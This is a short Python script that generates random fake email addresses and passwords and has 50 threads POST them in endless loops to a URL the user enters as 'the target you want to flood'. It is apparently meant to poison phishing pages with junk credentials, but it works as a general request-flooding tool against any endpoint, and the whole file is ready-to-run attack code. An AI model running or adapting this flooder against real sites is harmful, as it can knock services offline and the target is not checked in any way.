import threading
import requests
import random
import string

import names

# List of names to generate email addresses
generated_names = []

# Generate a list of random names.

for _ in range(1000):
    name = names.get_first_name().lower() + names.get_last_name().lower()
    name = name.replace(" ", "")
    generated_names.append(name)

domains = ["outlook.com", "gmail.com", "yahoo.com", "mail.ru"]

def generate_random_email():
    name = random.choice(generated_names)
    domain = random.choice(domains)  # You can change this domain
    return name + str(random.randint(1, 100)) + "@" + domain

def generate_random_password():
    # Generate a random password of length 8
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(8))

def send_posts(url):
    while True:
        email = generate_random_email()
        password = generate_random_password()
        data = {
            "a": email,
            "az": password
        }
        response = requests.post(url, data=data)
        print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}")

def mock_send():
    for _ in range(200):
        email = generate_random_email()
        password = generate_random_password()
        print(f"Email: {email}, Password: {password}")

def main():
    # Ask user for URL to flood
    url = input("Enter the URL of the target you want to flood: ")

    threads = []

    for i in range(50):
        t = threading.Thread(target=send_posts, args=(url,))
        t.daemon = True
        threads.append(t)

    for i in range(50):
        threads[i].start()

    for i in range(50):
        threads[i].join()

if __name__ == "__main__":
    main()
